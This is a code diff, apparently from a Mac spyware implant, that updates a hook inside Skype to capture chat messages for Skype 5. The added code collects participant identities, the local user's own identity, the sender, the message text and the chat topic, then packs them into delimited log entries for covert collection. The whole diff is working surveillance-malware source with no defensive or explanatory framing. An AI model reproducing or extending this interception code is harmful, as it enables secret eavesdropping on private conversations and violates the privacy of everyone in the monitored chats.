@@ -13,6 +13,8 @@
 #import "RCSMDebug.h"
 
 
+static BOOL gIsSkype2 = YES;
+
 @implementation mySkypeChat
 
 - (BOOL)isMessageRecentlyDisplayedHook: (uint)arg1
@@ -22,6 +24,10 @@
   
   if ([self respondsToSelector: @selector(getChatMessageWithObjectID:)])
     {
+#ifdef DEBUG_IM_SKYPE
+      infoLog(@"Responds to getChatMessageWithObjectID");
+#endif
+
       SEL sel = @selector(getChatMessageWithObjectID:);
       
       NSMethodSignature *signature = [self methodSignatureForSelector: sel];
@@ -39,16 +45,16 @@
 #ifdef DEBUG_IM_SKYPE
       errorLog(@"Skype does not responds to getChatMessageWithObjectID");
 #endif
-      return NO;
+      return success;
     }
-  
+
   if (message == nil)
     {
 #ifdef DEBUG_IM_SKYPE
       errorLog(@"[ERR] Failed to obtain message");
 #endif
       
-      return NO;
+      return success;
     }
   
   NSArray *_activeMembers;
@@ -57,10 +63,6 @@
   
   if (message != nil)
     {
-#ifdef DEBUG_IM_SKYPE
-      infoLog(@"posterHandles: %@", [self performSelector: @selector(posterHandles)]);
-#endif
-      
       if ([self respondsToSelector: @selector(activeMemberHandles)]) // Skype < 2.8.0.722
         {
           _activeMembers = [NSArray arrayWithArray: [self performSelector: @selector(activeMemberHandles)]];
@@ -69,28 +71,64 @@
         {
           _activeMembers = [NSArray arrayWithArray: [self performSelector: @selector(posterHandles)]];
         }
-      
+      else if ([self respondsToSelector: @selector(memberContacts)]) // Skype 5.0.0.7994
+        {
+          _activeMembers = [NSArray arrayWithArray: [self performSelector: @selector(memberContacts)]];
+          gIsSkype2 = NO;
+        }
+      else
+        {
+          _activeMembers = [NSArray arrayWithObject: @"EMPTY"];
+        }
+
       if ([message body] != NULL)
         {
           int x;
           
           for (x = 0; x < [_activeMembers count]; x++)
             {
-              NSString *entry = [_activeMembers objectAtIndex: x];
-              
-              [activeMembers appendString: entry];
-              
+              id entry = [_activeMembers objectAtIndex: x];
+
+              if ([entry isKindOfClass: [NSString class]])
+                {
+                  // Skype 2.x NSString entries
+                  [activeMembers appendString: entry];
+                }
+              else
+                {
+                  // Skype 5.x SkypeChatContact entries
+                  [activeMembers appendString: [entry performSelector: @selector(identity)]];
+                }
+
+              // Add a text delimeter in case it's not the last entry
               if (x != [_activeMembers count] - 1)
                 [activeMembers appendString: @" | "];
             }
           
+#ifdef DEBUG_IM_SKYPE
+          infoLog(@"activeMembers: %@", activeMembers);
+#endif
+
+          //
+          // In Skype 5 we don't have ourself inside the chat members list
+          //
+          if (gIsSkype2 == NO)
+            {
+              id myself = [self performSelector: @selector(myMemberContact)];
+              [activeMembers appendFormat: @" | %@", [myself identity]];
+
+#ifdef DEBUG_IM_SKYPE
+              infoLog(@"myself: %@", [myself identity]);
+#endif
+            }
+
           // Appending date and time
           //[loggedText appendFormat: @"%@ ", [message date]];
 
           // Appending the contact name that sent the message
           MacContact *fromContact = [message fromUser];
           [loggedText appendFormat: @"%@: ", [fromContact identity]];
-          
+
           // Appending the message body
           [loggedText appendString: [message body]];
           
@@ -101,14 +139,33 @@
           infoLog(@"message: %@", loggedText);
 #endif
         }
+      else
+        {
+#ifdef DEBUG_IM_SKYPE
+          errorLog(@"Message body is NULL");
+#endif
+          return success;
+        }
+    }
+  else
+    {
+#ifdef DEBUG_IM_SKYPE
+      errorLog(@"Message is nil");
+#endif
+
+      return success;
     }
 
   // Start logging
-  NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
-  NSString *_processName      = [processInfo processName];
+  //NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
   NSString *_topic            = [self performSelector: @selector(topic)];
   
-  NSData *processName         = [_processName dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  NSData *processName;
+  if (gIsSkype2 == YES)
+    processName = [@"Skype 2" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  else
+    processName = [@"Skype 5" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+
   NSData *topic               = [_topic dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
   NSData *peers               = [activeMembers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
   NSData *content             = [loggedText dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
@@ -167,7 +224,7 @@
   unsigned int del = DELIMETER;
   [entryData appendBytes: &del
                   length: sizeof(del)];
-  
+
 #ifdef DEBUG_IM_SKYPE
   verboseLog(@"entryData: %@", entryData);
 #endif
